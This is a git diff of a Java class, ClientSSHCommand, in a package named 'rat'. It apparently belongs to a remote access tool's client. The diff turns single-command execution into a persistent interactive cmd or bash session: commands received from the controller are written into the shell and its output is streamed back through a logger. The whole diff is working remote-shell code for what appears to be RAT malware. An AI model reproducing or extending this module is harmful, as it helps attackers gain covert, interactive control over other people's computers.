@@ -1,16 +1,15 @@
 package main.java.rat.command.clientCommands;
 
 import main.java.rat.command.ClientCommand;
-import main.java.rat.command.InteractableCommand;
+import main.java.rat.command.SessionCommand;
 
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
+import java.io.*;
 
-public class ClientSSHCommand extends ClientCommand implements InteractableCommand {
+public class ClientSSHCommand extends ClientCommand implements SessionCommand {
 
     boolean isInSession = false;
-    private Runtime terminalProcess;
+    private Process terminalProcess;
+    private PrintWriter terminalWriter;
 
     @Override
     public String getMainCommandName() {
@@ -29,10 +28,49 @@ public class ClientSSHCommand extends ClientCommand implements InteractableComma
 
     @Override
     public boolean executeCommand() {
-        isInSession = true;
+
         logger.log("Entered SSH session. Use 'exit' to exit the session");
-        terminalProcess = Runtime.getRuntime();
+        try {
+            boolean isWindows = System.getProperty("os.name").toLowerCase().contains("win");
+            String process = isWindows ? "cmd" : "bash";
+
+            ProcessBuilder pb = new ProcessBuilder(process);
+            pb.redirectErrorStream(true);
+
+            terminalProcess = pb.start();
+            terminalWriter = new PrintWriter(terminalProcess.getOutputStream());
+
+            listenToProcess();
+            isInSession = true;
+            environment.state.setInSession(true);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+
         return true;
+    }
+
+    private void listenToProcess() {
+        new Thread(() -> {
+            BufferedReader processStream = new BufferedReader(
+                    new InputStreamReader(terminalProcess.getInputStream())
+            );
+
+            while(isInSession) {
+                try {
+                    String line;
+                    while((line = processStream.readLine()) != null) {
+                        logger.log(line);
+                    }
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
+
+            try {
+                processStream.close();
+            } catch (IOException ignored) {}
+        }).start();
     }
 
     @Override
@@ -41,28 +79,9 @@ public class ClientSSHCommand extends ClientCommand implements InteractableComma
     }
 
     @Override
-    public void execute(String command) {
-        try {
-            Process process = terminalProcess.exec("cmd /c "+command);
-            StringBuilder output = new StringBuilder();
-
-            BufferedReader reader = new BufferedReader(
-                    new InputStreamReader(process.getInputStream()));
-
-            String line;
-            while ((line = reader.readLine()) != null) {
-                output.append(line).append("\n");
-            }
-
-            int exitVal = process.waitFor();
-            if (exitVal == 0) {
-                logger.log(output.toString());
-            } else {
-                logger.log(output.toString());
-            }
-        } catch (IOException | InterruptedException e) {
-            logger.log(e.getMessage());
-        }
+    public void receivedInput(String command) {
+        terminalWriter.println(command+"\n");
+        terminalWriter.flush();
     }
 
     @Override
@@ -72,7 +91,8 @@ public class ClientSSHCommand extends ClientCommand implements InteractableComma
 
     @Override
     public void exit() {
-        this.isInSession = false;
+        isInSession = false;
+        environment.state.setInSession(false);
         logger.log("Exiting ssh...");
     }
 }
